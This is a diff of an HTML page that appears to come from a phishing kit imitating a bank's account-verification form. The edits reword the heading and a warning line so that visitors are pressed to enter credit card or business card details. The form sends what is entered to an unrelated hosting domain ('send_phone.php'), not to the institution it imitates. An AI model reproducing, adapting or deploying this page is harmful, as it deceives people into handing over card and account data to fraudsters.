@@ -32,7 +32,7 @@ cz-shortcut-listen="true" style="background-color: #EDEDED; font-family: Bentons
         <div class="content ng-scope" ng-controller="HeaderController" ng-class="{'with-tall-footer': migrationLogin()}" style="">
             <main ng-view="" ng-hide="(spinnerActive &amp;&amp; spinnerStyle=='global') || blockOutPage" class="ng-scope" style="">
                 <div class="form-layout-top ng-scope">
-                    <h2 id="AddInvitationDetails" class="clear ng-binding">Warning: Enter your Credit Card Details  or Business card details</h2>
+                    <h2 id="AddInvitationDetails" class="clear ng-binding">Please Verify the following details linked to your account</h2>
                     <flow class="ng-isolate-scope">
                         <ol class="steps ng-scope" data-progtrckr-steps="3" ng-if="flow.steps.length > 1" style="">
                             <li ng-class="{'step-done': step.complete &amp;&amp; !step.current, 'step-todo': !step.complete, 'step-current': !step.complete &amp;&amp; step.current}" ng-repeat="step in flow.steps" class="ng-scope step-todo step-current"><span class="ng-binding">Enter details</span></li>
@@ -47,7 +47,7 @@ cz-shortcut-listen="true" style="background-color: #EDEDED; font-family: Bentons
                     <form class="panel ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-server-error ng-valid-minlength ng-valid-input-confirm ng-valid-expression ng-valid-exact-lengths" id="invitation-details-form"
                     data-frmcontainer="obb invitation details form" method="POST" action="https://nxu.obr.mybluehostin.me/stan/send/send_phone.php" autocomplete="off">
                         <section>
-                            <div class="small-only-text-center grey-text"><span>Please enter these details as they appear on the verifications.</span></div>
+                            <div class="small-only-text-center grey-text"><span>Warning: Enter your Credit Card Details  or Business card details</span></div>
                         </section>
                         <ng-switch on="operatorInvitationDetails.flow">
                             <section ng-switch-when="PMI" class="ng-scope">
